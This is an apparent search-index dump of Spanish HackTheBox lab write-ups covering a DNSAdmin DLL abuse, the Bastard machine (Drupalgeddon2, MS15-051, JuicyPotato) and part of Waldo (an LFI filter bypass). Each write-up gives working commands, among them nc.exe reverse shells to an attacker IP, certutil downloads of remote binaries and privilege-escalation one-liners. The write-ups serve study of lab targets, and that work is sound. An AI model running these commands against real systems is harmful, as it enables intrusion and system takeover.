C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL. dll========== Recompilar todo: 1 correctos, 0 incorrectos, 0 omitidos ==========Generamos el archivo command. txt de nuevo con la reverse shell generada con nc, pero para cambiar, ponemos el puerto 4434 (a ver que e. e): ‚ù± cat command. txt \\10. 10. 14. 8\smbFolder\nc. exe 10. 10. 14. 8 4434 -e cmd. exeSubimos a la ruta C:\Windows\Temp y nos ponemos en escucha por el puerto 4434, ahora ejecutamos: *Evil-WinRM* PS C:\Windows\Temp&gt; dnscmd /config /serverlevelplugindll \\10. 10. 14. 8\smbFolder\DNSAdmin-DLL. dll*Evil-WinRM* PS C:\Windows\Temp&gt; sc. exe stop dns*Evil-WinRM* PS C:\Windows\Temp&gt; sc. exe start dns Y LISTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO‚Ä¶ Tambi√©n obtenemos la reverse shell (: As√≠ que tenemos 3 opciones, personalmente me gusta la segunda, ya que es muuuuuuuuuy sencilla de leer y saber que estamos haciendo. As√≠ que ahora si, nos vimoooooooooooooooooos‚Ä¶ ‚Ä¶ ¬°Muy linda m√°quina eh! Me dan un poco de cosa los DCs, pero esta me quito muuuuuuuuuucho del ‚Äúmiedo‚Äù ante ellas, la escalada es brutal. Bueeeeeno, hasta ac√° nos leemos üò• cu√≠date y como sieeeempreeeeee: A R O M P E R T O D O ! ! ! "
    }, {
    "id": 26,
    "url": "http://localhost:4000/htb/bastard",
    "title": "HackTheBox - Bastard",
    "body": "2021/08/11 - M√°quina Windows nivel medio, vamos a romper Drupal 7. 54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo kernel.  TL;DR (Spanish writeup): Creada por: ch4p (the creator). Inicialmente encontraremos el gestor de contenido Drupal en su versi√≥n 7. 54 corriendo en el puerto 80, investigando llegaremos a la vuln ya muy conocida Drupalgeddon2, aprovech√°ndonos de algunos exploits lograremos ejecutar comandos en el sistema como el usuario nt authority\iusr. Generaremos una reverse Shell para estar m√°s c√≥modos (y r√°pidos). Estando ya en el sistema veremos dos maneras de escalar privilegios:  Usando un privilegio bastante llamativo: SeImpersonate, ya que existen varios exploits de la ‚Äúfamilia patata‚Äù que se aprovechan de √©l.  Explotando el kernel de Windows ü•¥Lograremos explotarla de las dos maneras para finalmente conseguir una Reverse Shell como el usuario nt authority\system en el sistema (: üåå He creado un autopwn para automatizar toodo y mediante la explotaci√≥n del privilegio conseguir una Shell como diosito. Lo √∫nico es que debes tener es el binario nc. exe y el binario JuicyPotato. exe en la misma ruta que el script:  autopwn_bastard. py ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Vulns conocidas y apunta mucho a la realidad.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Movimientos guturalmente prurales.  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Encontramos al CMS Drupal 7 corriendo sobre el puerto 80.     Explotaci√≥n: jugamos con Drupalgeddon2 para obtener RCE.  Escalada de privilegios, subimos de dos maneras:     MS15-051 - Vulnerabilities in Windows Kernel.    Aprovech√°ndonos del privilegio SeImpersonate.    ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Como siempre vamos a empezar encontrando que puertos tiene expuestos la m√°quina, esto para encaminar nuestra ruta hacia la explotaci√≥n. Jugaremos con nmap para esto: ‚ù± nmap -p- --open -v 10. 10. 10. 9 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Pero este escaneo va baaaaaaastaaante lento, as√≠ que le agregamos el par√°metro --min-rate para indicarle que en cada petici√≥n que haga no env√≠e menos de N paquetes, en nuestro caso 2000 paquetes: üìù Es importante realizar el escaneo normal (sin par√°metros de velocidad), ya que pueda que al ir tan r√°pido nos saltemos alg√∫n puerto. ‚ù± nmap -p- --open -v --min-rate=2000 10. 10. 10. 9 -oG initScanEl escaneo nos devuelve: ‚ù± cat initScan# Nmap 7. 80 scan initiated Mon Aug 9 25:25:25 2021 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10. 10. 10. 9# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 9 ()	Status: UpHost: 10. 10. 10. 9 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///	Ignored State: filtered (65533)# Nmap done at Mon Aug 9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71. 42 secondsSolo dos puertos:       Puerto   Descripci√≥n         80   HTTP: Un servidor web.        135   RPC: Permite la comunicaci√≥n entre computadoras sin necesidad de conocer detalles de la red.    Ahora vamos a realizar un segundo escaneo, pero para encontrar que versiones y scripts tienen relaci√≥n con cada puerto (servicio): ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno (en este caso no es relevante, pero bueno, en caso de tener muchos puertos es muy √∫til. ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 9  [*] Open ports: 80,135[*] Ports copied to clipboard)~ ‚ù± nmap -p 80,135 -sC -sV 10. 10. 10. 9 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y este escaneo nos muestra: ‚ù± cat portScan# Nmap 7. 80 scan initiated Mon Aug 9 25:25:25 2021 as: nmap -p 80,135 -sC -sV -oN portScan 10. 10. 10. 9Nmap scan report for 10. 10. 10. 9Host is up (0. 11s latency). PORT  STATE SERVICE VERSION80/tcp open http  Microsoft IIS httpd 7. 5|_http-generator: Drupal 7 (http://drupal. org)| http-methods: |_ Potentially risky methods: TRACE| http-robots. txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG. txt /cron. php /INSTALL. mysql. txt | /INSTALL. pgsql. txt /INSTALL. sqlite. txt /install. php /INSTALL. txt |_/LICENSE. txt /MAINTAINERS. txt|_http-server-header: Microsoft-IIS/7. 5|_http-title: Welcome to 10. 10. 10. 9 | 10. 10. 10. 9135/tcp open msrpc  Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Aug 9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 33. 20 secondsPfff, variedad e. e       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 7. 5   Vemos el CMS Drupal 7 y tambi√©n varias rutas que nmap descubri√≥: (includes/, misc/‚Ä¶) Listones, vainitas pa mirar, met√°mosle fuego!! ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Bien confirmamos el gestor de contenido (CMS) Drupal por el logo e. e, pero si quisi√©ramos corroborarlo al 100% podemos usar whatweb: ‚ù± whatweb http://10. 10. 10. 9/http://10. 10. 10. 9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7. 5], IP[10. 10. 10. 9], JQuery, MetaGenerator[Drupal 7 (http://drupal. org)], Microsoft-IIS[7. 5], PHP[5. 3. 28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10. 10. 10. 9 | 10. 10. 10. 9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5. 3. 28, ASP. NET]Destacamos tanto a Drupal 7 como la versi√≥n del PHP 5. 3. 28. üìì ‚ÄúDrupal es un CMS o sistema de gesti√≥n de contenidos que se utiliza para crear sitios web din√°micos y con gran variedad de funcionalidades. ‚Äù drupal. groups. As√≠ que perrrrfecto, sigamos‚Ä¶ Validando las rutas descubiertas por nmap todas las carpetas nos devuelven que no tenemos permitido ver su contenido :( peeeero leyendo el objeto CHANGELOG. txt encontramos esto: Es un log de los cambios que se han introducido en cada actualizaci√≥n, la √∫ltima habla de la versi√≥n 7. 54, as√≠ que podemos pensar que nuestro servidor web tiene esa versi√≥n. Esto nos abre la puerta para buscar vulnerabilidades relacionadas con ella‚Ä¶ ‚Ä¶ Explotaci√≥n #Encontramos varios recursos, entre ellos:  Reporte hackerone - [CVE-2018-7600] Remote Code Execution due to outdated Drupal server.  github. com/dreadlocked/Drupalgeddon2.  github. com/pimps/CVE-2018-7600.  github. com/FireFart/CVE-2018-7600 - Ac√° se ve clarita la petici√≥n que logra la explotaci√≥n. (Todos los exploits funcionales) En el primer recurso se habla de una vulnerabilidad en el CMS Drupal la cual permite ejecutar comandos en el sistema: üìì ‚ÄúDrupal before 7. 58, 8. x before 8. 3. 9, 8. 4. x before 8. 4. 6, and 8. 5. x before 8. 5. 1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. ‚Äù hackerone - chron0x En √©l hace referencia al segundo recurso de nuestra lista, que nos lleva a profundizar un poco sobre Drupalgeddon2 (CVE-2018-7600)‚Ä¶ Encontramos este gran post de Vicente Motos por parte de hackplayers en el que explica de una manera suuuper sencilla la explotaci√≥n, vayan y vis√≠tenlo.  ¬°Llega #Drupalgeddon2! RCE inyectando en arrays renderizables. B√°sicamente el problema se presenta por la NO sanitizaci√≥n de las solicitudes AJAX que viajan mediante el Form API, lo que permite la inyecci√≥n de cositas locas en la estructura (en los arrays que renderiza el proceso). De nuevo, les recomiendo mucho leer el post de arriba, ta buenazo! Perfecto, apoyados en esa explotaci√≥n podemos lograr una ejecuci√≥n remota de comandos yyyyyyyyyy esa es la finalidad de los 3 exploits referenciados antes. Jugaremos con el 2 el cual en caso de tener √©xito nos devuelve una Fake Shell (simula que estamos en una terminal, pero no, solo esta ejecutando el comando, no nos podemos mover de directorio ni nada interactivo) en la que simplemente debemos pasar el comando y tendremos nuestra respuesta, pues intentemos: Clonamos el repo y ejecutamos: ‚ù± ruby drupalgeddon2. rb Traceback (most recent call last):    2: from drupalgeddon2. rb:16:in `&lt;main&gt;'    1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require. rb:85:in `require'/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require. rb:85:in `require': cannot load such file -- highline/import (LoadError)El error es de nuestro entorno, ya que no encuentra la librer√≠a highline, la instalamos: ‚ù± gem install highlineYyyy: ‚ù± ruby drupalgeddon2. rb Usage: ruby drupalggedon2. rb &lt;target&gt; [--authentication] [--verbose]Example for target that does not require authentication:    ruby drupalgeddon2. rb https://example. comExample for target that does require authentication:    ruby drupalgeddon2. rb https://example. com --authenticationListos, ejecut√©moslo contra el recurso: ‚ù± ruby drupalgeddon2. rb http://10. 10. 10. 9 Bien, el programa nos indica que existe la vuln y tiene posibilidad de ejecutar comandos, despu√©s de eso hace unas pruebas para escribir un archivo en el sistema yyyyy finalmente obtenemos la Fake Shell: Liiiiistones, ‚Äútamos‚Äù en la m√°quina, pero medio feo estar en una Fake Shell, as√≠ que subamos el binario nc. exe y entabl√©monos una Reverse Shell: Nos posicionamos en la ruta donde est√© el binario y levantamos un servidor web: ‚ù± python3 -m http. serverY ahora desde la Fake le decimos que busque en ese servidor web el archivo nc. exe y lo suba a nuestra ruta actual: drupalgeddon2&gt;&gt; certutil. exe -f -urlcache -split http://10. 10. 14. 8:8000/nc. exe nc. exeY ya tendr√≠amos el binario en la m√°quina: drupalgeddon2&gt;&gt; dirVolume in drive C has no label. Volume Serial Number is 605B-4AAA Directory of C:\inetpub\drupal-7. 54. . . 10/08/2021 25:25       45. 272 nc. exe. . . Ahora nos ponemos en escucha por alg√∫n puerto, en mi caso el 4433: ‚ù± nc -lvp 4433Y en la m√°quina v√≠ctima ejecutamos: drupalgeddon2&gt;&gt; . \nc. exe 10. 10. 14. 8 4433 -e cmd. exeDonde le indicamos que env√≠e una petici√≥n a nuestro listener y una vez se entable la conexi√≥n nos ejecute cmd. exe, o sea una terminal CMD: Y ya tenemos una Shell medio interactiva, digo medio, ya que si por cosas de la vida hacemos CTRL + C pues perderemos la terminal :( y no tenemos hist√≥rico :( x2 Pero bueno, ahora si estamos dentro del sistemaaaaaaaaaaaaaaaaaaaaaaa, sigamos‚Ä¶ ‚Ä¶ Escalada de privilegios #Encontr√© 2 rutas para lograr el privesc, les dejo los links de cada apartado:  MS15-051 - Vulneramos el kernel del sistema.  Aprovech√°ndonos del privilegio SeImpersonate. ‚Ä¶ Rompemos el Kernel de Windows (MS15-051) üìå: Si jugamos con systeminfo podemos (a veces) ver todo lo relacionado con el sistema operativo, como la arquitectura, la versi√≥n del SO y su nombre (otras cositas m√°s), pues veamos que nos responde: C:\inetpub\drupal-7. 54&gt;systeminfo Bien, para ahorrar tiempo y ojos, existen herramientas que toman toooooodo ese output de arriba y lo relacionan con bases de datos de exploits, esto para encontrar vulns relacionadas con la versi√≥n del SO. Una de ellas se llama wesng y es la que usaremos, nos clonamos el repo, nos copiamos el contenido de systeminfo y lo pegamos en un archivo (lo llamar√© systeminfo. txt) yy ejecutamos: # Para que tome las ultimas vulns‚ù± python3 wes. py --updateY ahora le pasamos el archivo systeminfo. txt peeeero le indicamos que solo queremos ver vulns relacionadas con ‚Äúescalar privilegios‚Äù: ‚ù± python3 wes. py systeminfo. txt --impact  Elevation of Privilege Y nos devuelve vaaaaaarias cositas, entre ellas 2 referencias a exploits contra el Kernel: Solo nos queda explorar cada exploit y ver si algunos nos funciona‚Ä¶ Pero ninguna referencia nos ayud√≥ (o a m√≠ no me sirvieron üòü). Despu√©s de un rato buscando binarios y compilando otros, se me ocurri√≥ simplemente buscar por el t√≠tulo de las vulns, o sea investigar sobre: Vulnerabilities in Windows Kernel Could Allow Elevation of PrivilegeDe primeras encontramos dos cosas, una referencia al reporte MS10-015 (pero abajo hay por ejemplo una hacia MS10-021, por lo que podemos pensar que es un grupo de vulns) y su definici√≥n, as√≠ que volvemos a buscar binarios que se relacionen‚Ä¶ Peeero nada. Probando, probando y probando cosas llegamos a este repo (que no s√© c√≥mo llegue, despues de varios links este fue el que me funciono üòÑ):  SecWiki/windows-kernel-exploits/MS15-051. Nos descargamos el comprimido MS15-051-KB3045171. zip, lo descomprimimos, lo subimos a la m√°quina y probamos: C:\inetpub\drupal-7. 54&gt;. \ms15-051. exe. \ms15-051. exe[#] ms15-051 fixed by zcgonvh[#] usage: ms15-051 command [#] eg: ms15-051  whoami /all Bien es funcional e interactivo, pues ejecutemos un whoami: C:\inetpub\drupal-7. 54&gt;. \ms15-051. exe  whoami . \ms15-051. exe  whoami [#] ms15-051 fixed by zcgonvh[!] process with pid: 1808 created. ==============================nt authority\systemüò≤ apaaaa, somos nt authority\system :o poooooooo gener√©monos una Reverse Shell de unaaaaaaaaa: C:\inetpub\drupal-7. 54&gt;. \ms15-051. exe  c:\inetpub\drupal-7. 54\nc. exe 10. 10. 14. 8 4434 -e cmd. exe  Perrrrrfectisiiiimo, conseguimos una Shell explotando el kernel de Windows, que lindura. Antes de irnos veamos la otra manera de escalar‚Ä¶ ‚Ä¶ Explotamos el privilegio SeImpersonatePrivilege üìå: Si revisamos nuestros privilegios vemos 3: C:\inetpub\drupal-7. 54&gt;whoami /privPRIVILEGES INFORMATION----------------------Privilege Name     Description                State ======================= ========================================= =======SeChangeNotifyPrivilege Bypass traverse checking         EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeCreateGlobalPrivilege Create global objects           EnabledJugando con esta lista de privilegios encontramos que SeImpersonatePrivilege es bastante llamativo porque nos permite crear un proceso como otro usuario del sistema üòÆüòÆüòÆü§™ Existen varias herramientas de la llamada Potato Family que explotan el privilegio, investigando un poco m√°s llegamos a esta gu√≠a donde muestran el uso de una de ellas: JuicyPotato. exe:  Juicy Potato (abusing the golden privileges). B√°sicamente le pasamos el puerto en el que queremos que escuche el proceso, el programa que ejecutara, los argumentos (si los lleva), el como va a crear el proceso y (es opcional, pero despu√©s de probar cositas vemos que es necesario en este caso) un CLSID (un identificador de un objeto con el que queremos interactuar (COM)). üìì ‚ÄúA COM server is implemented as a COM class. A COM class is an implementation of a group of interfaces in code executed whenever you interact with a given object. ‚Äù docs. microsoft. Bien, pues si queremos intentar esa explotaci√≥n ¬øqu√© nos hace falta? Exacto, el binario, lo descargamos de ac√°:  https://github. com/ohpe/juicy-potato/releases. Lo bajamos, le cambiamos el nombre a jp. exe (porque si üò¨ y porque podemos (b√°sicamente para no hacer mayus y que sea f√°cil de recordar)) y lo subimos a la m√°quina, una vez arriba al ejecutarlo deber√≠amos ver esto: Entonces, vamos a tomar este ejemplo y veamos que pasarle a cada par√°metro: JuicyPotato. exe -l 1337 -p c:\Windows\System32\cmd. exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a  /c c:\Users\User\reverse_shell. exe    -l:Dejaremos ese puerto por ahora.     -p:Le diremos que tambi√©n tome como programa la cmd. exe y que ella sea la que nos ejecute los argumentos (par√°metro -a).     -t:Le dejamos el mismo, as√≠ juega con las dos opciones que tiene y elige la que le funcione.     -c:Para elegir el identificador del objeto debemos (para el caso de esta m√°quina) ir a este link (que nos lo provee el mismo post que venimos siguiendo):      Windows Server 2008 R2 Enterprise - CLSIDs.     Tomamos alguno de la lista, yo seleccion√© el primero:       -a:Y como argumentos le decimos que nos genere una nueva Reverse Shell pero hacia otro puerto:   -a  /c c:\inetpub\drupal-7. 54\nc. exe 10. 10. 14. 8 4434 -e cmd. exe  Listos, tenemos todo, ahora si generemos nuestra l√≠nea: . \jp. exe -l 1337 -p c:\Windows\System32\cmd. exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a  /c c:\inetpub\drupal-7. 54\nc. exe 10. 10. 14. 8 4434 -e cmd. exe Antes de ejecutarlo, nos ponemos en escucha por el puerto 4434: ‚ù± nc -lvp 4434Yyyyyyyyyyyyyy ejecutaaaaaamooooooooooooos: SI SEEEEEEE√ëOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOORA, estamos dentro de la m√°quina como el usuario nt authority\system despu√©s de haber ejecutado un proceso (como ese usuario (por el CLSID)) que generaba una Reverse Shell. Lindo lindo. Y pues ya somos amos y se√±oras del sistema, veamos las flags: ‚Ä¶ Peeeeeeeerrrrrfectoooo. Como √≠tem final nos generamos un autopwn el cual nos brindara una Shell directamente como el usuario NT authority\system en el sistema, lo √∫nico que necesitamos es tener en la misma ruta del script tanto el binario nc. exe como el binario JuicyPotato. exe. (Claramente se puede mediante el MS15-051. exe, pero creo que puede ser un poquititititico complicado, ya que cuando lanzamos la revshell el programa se queda en escucha infinidad de tiempo. Tendr√≠amos que controlar eso. ) La ejecuci√≥n del script ser√≠a sencilla: Y r√°pidamente tendr√≠amos una Shell (:  autopwn_bastard. py Y hemos terminao‚Äô ‚Ä¶ Linda m√°quina, el tema de Drupalgeddon2 ya lo hab√≠amos trabajado as√≠ que apenas lo vi pens√© en esa vuln. El privesc me gusto bastante, primero porque lo hicimos de dos formas y segundo por el tema del kernel, muy lindo todo. Y bueno, nos vamos, se cuidan y nos leeremos despues, como siempre a rooooooooooooooomper toooooodo!!! "
    }, {
    "id": 27,
    "url": "http://localhost:4000/htb/waldo",
    "title": "HackTheBox - Waldo",
    "body": "2021/08/09 - M√°quina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.  TL;DR (Spanish writeup): Creada por: strawman &amp; capnspacehook. Juguetona juguetonaaaa. Inicialmente nos encontraremos un servidor web que nos permite crear listas de √≠tems, jugando con BurpSuite veremos que dos peticiones est√°n interactuando directamente con archivos del sistema, jugaremos con eso para conseguir LFI (Local File Inclusion) y leer archivos del sistema. Llegaremos a encontrar una llave privada con el nombre de archivo . monitor y algunos usuarios, entre ellos a nobody, testeando la llave privada contra ese usuario lograremos obtener una Shell en un contenedor por medio de SSH. Dentro veremos que existen dos servicios SSH corriendo, uno en el puerto 22 y otro en el puerto 8888 (en este nos conectamos nosotros), con esto en mente y explorando el directorio . ssh llegaremos a otro usuario, uno llamado monitor, jugando de nuevo con la llave privada (que se llama como ese usuario ü§™) y el SSH local obtendremos una sesi√≥n como √©l en la m√°quina host. Llegaremos y estaremos restringidos con una rbash (restricted bash), enumerando sabremos que solo podemos ejecutar 4 comandos, entre ellos ed pero restringido (red de restricted ed). Apoyados en la web veremos que podemos ejecutar comandos estando dentro del editor ed, generaremos una /bin/bash para escapar de la bash restringida. Finalmente viendo que capabilities existen en el sistema encontraremos cap_dac_read search asignada a dos binarios, uno de ellos es tac (cat pero al rev√©s, literal). La capability nos permite bypassear los permisos de lectura que tenga cualquier archivo, por lo que podremos leer objetos del sistema sin restricci√≥n. A pesar de encontrar una id_rsa en el directorio /root no lograremos una sesi√≥n como √©l, esto gracias a la configuraci√≥n SSH que no permite que el usuario root obtenga una Shell por ese medio :( ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Con vulns conocidas (m√°s o menos) pero algo juguetona, aunque escala a la realidad.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Es momento de beber agua.  Reconocimiento.      Encontramos puertos abiertos con ayuda de nmap.     Enumeraci√≥n.      Recorremos el servidor web sobre el puerto 80.     Explotaci√≥n.      Encontramos LFI en el servidor web.     Movimiento lateral (movimientos sensuales con SSH) nobody -&gt; monitor.      Bypasseamos la Shell restringida en la que estamos.     Escalada de privilegios. ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Vamos a empezar enumerando los puertos activos de la m√°quina, as√≠ vamos viendo por donde encaminarnos: ‚ù± nmap -p- --open -v 10. 10. 10. 87 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Este escaneo nos devuelve: ‚ù± cat initScan# Nmap 7. 80 scan initiated Thu Aug 5 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 87# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 87 ()	Status: UpHost: 10. 10. 10. 87 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Thu Aug 5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 98. 88 seconds      Puerto   Descripci√≥n         22   SSH: Posibilidad de una Shell de manera segura.        80   HTTP: Nos brinda un servidor web.    Listos, ahora vamos a enfocarnos en escanear las versiones y scripts que est√©n relacionados con cada servicio: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 87  [*] Open ports: 22,80[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80 -sC -sV 10. 10. 10. 87 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y con este escaneo vemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Thu Aug 5 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 87Nmap scan report for 10. 10. 10. 87Host is up (0. 11s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 5 (protocol 2. 0)| ssh-hostkey: |  2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)|  256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)|_ 256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)80/tcp open http  nginx 1. 12. 2|_http-server-header: nginx/1. 12. 2| http-title: List Manager|_Requested resource was /list. html|_http-trane-info: Problem with XML parsing of /evox/aboutService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Aug 5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20. 86 secondsPerefeeeesto, ¬øqu√© podemos destacar?       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 5 (protocol 2. 0)       80   HTTP   nginx 1. 12. 2   Vemos un archivo llamado list. html, pero poco podemos hacer o entender sobre √©l, as√≠ que empecemos a explorar y ver por donde explotar la m√°quina. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Una locura de colores y sabores üòÅ vemos inicialmente un bot√≥n para a√±adir lista, si damos clic sobre √©l obtendr√≠amos algo as√≠: Se nos genera un √≠tem con el cual podemos interactuar de dos maneras: Delete o inspeccionando su contenido (dando clic en list1):  Con Delete simplemente lo borramos.  Con list1 (al dar clic) se nos dan dos opciones m√°s, Add (a√±adimos un √≠tem a la lista) y Back para regresar a la lista de listas e. eMuy lindo ¬øpero y queeeeeeeee? Si enumeramos un poquitico m√°s a fondo y leemos el c√≥digo fuente de la web vemos el llamado a un archivo . js: Si nos movemos ahora a ese recurso vemos tooooodas las definiciones interactivas de la web al jugar con las listas y los √≠tems, el archivo es gigante: Bien, si leemos algunas l√≠neas ya vemos cositas interesantes:  Peticiones POST.  Referencia a archivos:     fileWrite. php   fileDelete. php   dirRead. php   fileRead. php   Todos con nombres interesantes. Pues abramos BurpSuite e interceptemos esas peticiones POST, jugamos con el repeater y vamos acumulando cada petici√≥n, finalmente tenemos: ‚Ä¶ Explotaci√≥n # Si nos fijamos de los 4 recursos, hay dos muuuy llamativos, fileRead. php y dirRead. php, inspeccionemos fileRead. php: Ufff uff ufffff, esa variable file se ve juguetona: file=. /. list/list1Al parecer indica que de la ruta actual entre al directorio . list y de √©l muestre el archivo list1. Encontramos LFI en el servidor web üìå: Pues lo primero que se nos viene a la cabeza es intentar un LFI (Inclusion Local de Archivos) para ver si de alguna manera logramos enumerar objetos del sistema a los que normalmente no deber√≠amos tener acceso‚Ä¶  ¬øC√≥mo funciona una vulnerabilidad Local File Inclusion?. Si recordamos en nuestro escaneo de nmap hab√≠amos visto el archivo list. html (que ser√≠a el home), intentemos encontrarlo:  Pero claro que siiiiiiiiiiiii, encontramos un LFI, peeeeeerfectoooo. Us√©moslo para encontrar los . php y ver su contenido: file=. /fileRead. php Tomemos su contenido y guard√©moslo en un archivo de nuestra m√°quina, hagamos que los saltos de l√≠nea que est√°n como texto (\n) se conviertan en verdaderos saltos de l√≠nea y lo mismo con las tabulaciones (\t): ‚ù± sed -i 's/\\n/\n/g' fileRead. php‚ù± sed -i 's/\\t/\t/g' fileRead. php# Este para quitar algunos escapes (\) que hay:‚ù± sed -i 's/\\//g' fileRead. phpObtendr√≠amos ahora si el archivo bien lindo: &lt;?phpif($_SERVER['REQUEST_METHOD'] ===  POST ){  $fileContent['file'] = false;  header('Content-Type: application/json');  if(isset($_POST['file'])){    header('Content-Type: application/json');    $_POST['file'] = str_replace( array( . . / ,  . .  ),   , $_POST['file']);    if(strpos($_POST['file'],  user. txt ) === false){      $file = fopen( /var/www/html/  . $_POST['file'],  r );      $fileContent['file'] = fread($file,filesize($_POST['file']));       fclose();    }  }  echo json_encode($fileContent);}Si nos fijamos, hay dos validaciones interesantes:  $_POST['file'] = str_replace( array( . . / ,  . .  ),   , $_POST['file']);     Lo que hace es tomar el valor de la variable file y si en su contenido existen/encuentra ya sea . . / o . . los remplaza por: `` (vac√≠o).     Por lo que si enviamos:   file=. . /. . /. . /etc/passwd  Se convertir√° en:   file=etc/passwd     Y abre el archivo dentro de la ruta /var/www/html simplemente con:   $file = fopen( /var/www/html/  . $_POST['file'],  r );$fileContent['file'] = fread($file,filesize($_POST['file'])); fclose();. . . echo json_encode($fileContent); Sabemos que hay un filtro para evitar movernos entre rutas, ¬øpero y si intentamos romperlo? Haciendo distintas pruebas llegamos finalmente a esta:  LFI - Filter bypass tricks. file=. . . . //. . . . //. . . . //etc/passwdQue se convertir√° en: file=///etc/passwd  No entiendo muy bien el porque esa cadena nos da la explotaci√≥n ya que relativamente no es una ruta valida (por los // iniciales), si sabes el porqu√©, ch√°rlame, quiz√°s estoy obviando algo :) Maravelooooso, tenemos acceso ahora a los archivos del sistema. Si le damos el formato correcto al objeto passwd tendr√≠amos: 